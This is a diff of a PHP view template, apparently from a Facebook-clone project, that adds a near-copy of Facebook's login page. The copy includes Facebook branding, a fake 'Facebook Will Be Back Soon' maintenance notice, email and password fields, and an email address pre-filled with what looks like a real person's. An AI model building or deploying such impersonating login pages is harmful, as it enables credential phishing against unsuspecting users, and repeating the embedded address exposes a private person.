@@ -1,1 +1,91 @@
-<?php echo 'Account index' ?>
+<?php use Application\Service;
+
+use Application\Validation;
+
+use Application\SessionNames; ?>
+
+<!-- Header -->
+<div data-referrer="pagelet_bluebar" id="pagelet_bluebar">
+	<div id="blueBarHolder">
+		<div id="blueBar">
+			<div class="loggedout_menubar_container">
+  				<div class="clearfix loggedout_menubar">
+  					<a title="<?php echo $this->translate('Go to ProjectName Home')?>" href="/" class="lfloat">
+  						<i class="fb_logo img sp_1zq7t7 sx_082ee8"><u><?php echo $this->translate('ProjectName logo')?></u></i>
+  					</a>	  				
+  				</div>
+			</div>
+			<div class="signupBanner_v1">
+			    <div class="signup_bar_container">
+			        <div class="signup_box clearfix">
+			            <a href="#" class="signup_btn uiButton uiButtonSpecial uiButtonLarge">
+			                <span class="uiButtonText"><?php echo $this->translate('Sign Up')?></span>
+			            </a>
+			            <span class="signup_box_content"><?php echo $this->translate('Connect and share with the people in your life.')?></span>
+			        </div>
+			    </div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="uiContextualLayerParent" id="globalContainer">
+	
+	<div class="fb_content clearfix" id="content">        
+        <div class="UIFullPage_Container">
+            <div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
+                <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                    <div class="clearfix uiHeaderTop">                        
+                        <div>
+                            <h2 class="uiHeaderTitle">Facebook Login</h2>
+                        </div>
+                    </div>
+                 </div>
+                 <div class="phl ptm">
+                     <div class="login_form_container">
+                         <form method="post" action="#" id="login_form">
+                             <input type="hidden" autocomplete="off" value="AVqmBoQ2" name="lsd">
+                             <div class="pam login_error_box uiBoxRed">
+                                 <div class="fsl fwb fcb">Facebook Will Be Back Soon</div>
+                                 <div>Facebook is down for required maintenance right now, but you should be able to get back on within a few minutes. In the meantime, <a href="#">read more</a> about why you're seeing this message. Thanks for your patience as we improve the site.
+                                 </div>
+                             </div>
+                             <div id="loginform">                                 
+                                 <div class="form_row clearfix">
+                                     <label class="login_form_label" for="email">Email or Phone:</label>
+                                     <input type="text" value="btphuong2345@yahoo.com" name="email" id="email" class="inputtext">
+                                 </div>
+                                 <div class="form_row clearfix">
+                                     <label class="login_form_label" for="pass">Password:</label>
+                                     <input type="password" class="inputpassword" id="pass" name="pass">
+                                 </div>
+                                 <div class="persistent">
+                                     <div class="uiInputLabel clearfix">
+                                         <input type="checkbox" class="uiInputLabelCheckbox" name="persistent" value="1" id="persist_box">
+                                         <label for="persist_box">Keep me logged in</label>
+                                     </div>
+                                 </div>
+                                 <div class="form_row clearfix" id="buttons">
+                                     <label class="login_form_label"></label>
+                                 <div id="login_button_inline">
+                                     <label for="u3a4sfe2" id="loginbutton" class="uiButton uiButtonConfirm uiButtonLarge">
+                                         <input type="submit" id="u3a4sfe2" name="login" value="Log In">
+                                     </label>
+                                 </div>
+                                 <div id="register_link">or <strong><a tabindex="-1" id="reg_btn_link" rel="nofollow" target="_self" href="#">Sign up for Facebook</a></strong>
+                                 </div>
+                                 </div>
+                                     <p class="reset_password form_row"><a tabindex="-1" target="" href="#">Forgot your password?</a></p>
+                             </div>
+                         </form>
+                     </div>
+                 </div>
+             </div>             
+             <?php echo $this->render('layout/languages_mini.phtml') ?>
+         </div>              
+     </div> 
+	 <?php echo $this->render('layout/footer.phtml') ?>	
+
+</div>
+
+
